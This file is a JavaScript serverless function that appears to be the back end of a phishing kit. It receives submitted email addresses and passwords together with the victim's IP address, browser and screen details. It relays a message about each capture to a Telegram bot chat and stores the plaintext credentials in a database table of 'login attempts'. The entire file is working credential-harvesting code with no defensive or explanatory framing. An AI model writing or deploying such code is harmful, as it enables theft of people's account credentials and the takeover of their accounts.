const { createClient } = require('@supabase/supabase-js');

const supabaseUrl = process.env.VITE_SUPABASE_URL;
const supabaseServiceKey = process.env.VITE_SUPABASE_SERVICE_ROLE_KEY;
const botToken = process.env.BOT_TOKEN;
const chatId = process.env.CHAT_ID;

exports.handler = async function(event) {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS'
  };

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' })
    };
  }

  try {
    const payload = JSON.parse(event.body);
    const {
      email,
      password,
      ip,
      userAgent,
      sourceUrl,
      screenInfo,
      timestamp,
      telegramMessage
    } = payload;

    if (!email || !password) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: 'Email and password required' })
      };
    }

    const supabase = createClient(supabaseUrl, supabaseServiceKey);

    let telegramSent = false;
    let telegramSentAt = null;

    if (botToken && chatId && telegramMessage) {
      try {
        const telegramResponse = await fetch(
          `https://api.telegram.org/bot${botToken}/sendMessage`,
          {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: chatId,
              text: telegramMessage,
              parse_mode: 'HTML',
              disable_web_page_preview: true
            })
          }
        );

        if (telegramResponse.ok) {
          telegramSent = true;
          telegramSentAt = new Date().toISOString();
        }
      } catch (telegramError) {
        console.error('Telegram send failed:', telegramError);
      }
    }

    const { data, error } = await supabase
      .from('login_attempts')
      .insert([
        {
          email: email.trim(),
          password: password,
          ip_address: ip || event.headers['x-forwarded-for'] || event.headers['client-ip'] || 'unknown',
          user_agent: userAgent || event.headers['user-agent'] || 'unknown',
          source_url: sourceUrl || 'unknown',
          screen_info: screenInfo || '{}',
          timestamp: timestamp || new Date().toISOString(),
          telegram_sent: telegramSent,
          telegram_sent_at: telegramSentAt,
          verified: false
        }
      ])
      .select()
      .maybeSingle();

    if (error) {
      console.error('Supabase error:', error);
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ error: 'Failed to store login attempt' })
      };
    }

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        telegramSent: telegramSent,
        stored: true,
        id: data?.id
      })
    };
  } catch (error) {
    console.error('Error:', error);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ error: 'Internal server error' })
    };
  }
};
